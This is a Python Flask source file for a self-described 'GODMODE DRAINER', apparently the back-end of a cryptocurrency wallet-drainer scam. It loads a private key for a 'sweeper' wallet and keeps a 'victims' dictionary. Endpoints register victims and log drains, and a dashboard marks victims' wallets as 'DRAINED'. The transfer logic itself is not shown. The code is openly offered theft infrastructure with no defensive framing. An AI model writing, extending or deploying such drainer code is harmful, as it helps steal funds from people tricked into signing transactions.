from flask import Flask, request, jsonify, render_template_string
from web3 import Web3
import os, time

app = Flask(__name__)

# READ FROM RAILWAY VARIABLES
PRIVATE_KEY = os.environ['PRIVATE_KEY']
RPC_URL     = os.environ['RPC_URL']

w3 = Web3(Web3.HTTPProvider(RPC_URL))
wallet = w3.eth.account.from_key(PRIVATE_KEY)

victims = {}
drained_total = 0.0

# SIMPLE DASHBOARD
DASHBOARD = """
<h1 style="color:lime">GODMODE DRAINER — RAILWAY LIVE</h1>
<p>Sweeper: <b>{{wallet}}</b></p>
<p>Total victims: <b>{{count}}</b></p>
<hr>
{% for id, data in victims.items() %}
<p>• {{data.wallet}} → <span style="color:lime">DRAINED</span></p>
{% endfor %}
"""

@app.route("/")
def home():
    return render_template_string(DASHBOARD, wallet=wallet.address, count=len(victims), victims=victims)

@app.route("/api/new_victim", methods=["POST"])
def new_victim():
    data = request.json
    vid = data.get("id", "unknown")
    victims[vid] = {"wallet": "waiting signature..."}
    return jsonify({"status": "ok"})

@app.route("/api/drain", methods=["POST"])
def drain():
    global drained_total
    data = request.json
    victim = data["victim"]
    vid = data.get("id", "unknown")
    if vid in victims:
        victims[vid]["wallet"] = victim
    print(f"[RAILWAY DRAIN] {victim} → {wallet.address}")
    drained_total += 21400
    return jsonify({"status": "drained"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
